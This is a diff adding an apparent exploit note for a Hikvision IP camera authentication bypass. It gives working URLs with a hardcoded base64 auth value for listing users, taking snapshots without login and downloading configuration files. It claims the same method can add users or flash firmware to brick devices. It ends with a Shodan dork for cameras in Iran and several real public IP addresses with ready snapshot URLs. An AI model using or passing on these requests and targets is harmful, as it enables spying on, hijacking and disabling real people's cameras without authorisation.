@@ -1,0 +1,28 @@
+Retrieve a list of all users and their roles:
+    http://camera.ip/Security/users?auth=YWRtaW46MTEK
+
+Obtain a camera snapshot without authentication:
+    http://camera.ip/onvif-http/snapshot?auth=YWRtaW46MTEK
+
+All other HikCGI calls can be impersonated in the same way, including those that add new users or flash camera 
+firmware. Because most Hikvision devices only protect firmware images by obfuscation, one can flash arbitrary code  or 
+render hundreds of thousands of connected devices permanently unusable with just one simple http call.
+
+And worst of all, one can download camera configuration:
+    http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK
+
+
+
+Dork on shodan.io : "App-webs" "200 OK" country:"IR"
+
+******************************************************************************************************************************************************************************************************************************
+
+Example : http://91.98.131.177/onvif-http/snapshot?auth=YWRtaW46MTEK
+
+http://188.158.220.232/onvif-http/snapshot?auth=YWRtaW46MTEK
+
+http://185.153.210.138:82/onvif-http/snapshot?auth=YWRtaW46MTEK
+
+http://94.183.171.254/onvif-http/snapshot?auth=YWRtaW46MTEK
+
+http://91.98.27.46/onvif-http/snapshot?auth=YWRtaW46MTEK
